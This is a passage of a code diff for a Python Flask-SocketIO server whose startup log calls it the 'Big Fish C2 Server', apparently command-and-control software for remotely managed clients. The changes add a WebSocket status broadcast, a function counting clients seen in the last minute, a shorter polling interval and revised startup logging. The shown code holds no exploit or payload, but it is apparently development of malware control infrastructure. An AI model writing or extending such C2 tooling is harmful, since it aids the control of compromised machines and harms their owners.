     """Clean up old data"""
     while True:
@@ -1416,10 +795,31 @@ def update_client_status():
             conn.commit()
             conn.close()
             
+            # Broadcast status update
+            socketio.emit('status_update', {
+                'timestamp': current_time,
+                'online_count': get_online_count()
+            })
+            
         except Exception as e:
             logger.error(f"[✗] Status update error: {e}")
         
-        time.sleep(60)  # Run every minute
+        time.sleep(30)  # Run every 30 seconds
+
+def get_online_count():
+    """Get count of online clients"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        current_time = time.time()
+        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
+        count = c.fetchone()[0]
+        conn.close()
+        return count
+    except:
+        return 0
+
+# ==================== MAIN ====================
 
 if __name__ == '__main__':
     PORT = int(os.environ.get('PORT', 5000))
@@ -1429,7 +829,8 @@ if __name__ == '__main__':
     threading.Thread(target=update_client_status, daemon=True).start()
     
     logger.info(f"[✓] Big Fish C2 Server starting on port {PORT}")
-    logger.info(f"[✓] Encryption key: {ENCRYPTION_KEY[:20]}...")
-    logger.info(f"[✓] Download folder: {os.path.abspath(DOWNLOAD_FOLDER)}")
+    logger.info(f"[✓] WebSocket enabled")
+    logger.info(f"[✓] Database: {os.path.abspath(DATABASE)}")
+    logger.info(f"[✓] Encryption key loaded")
     
     socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
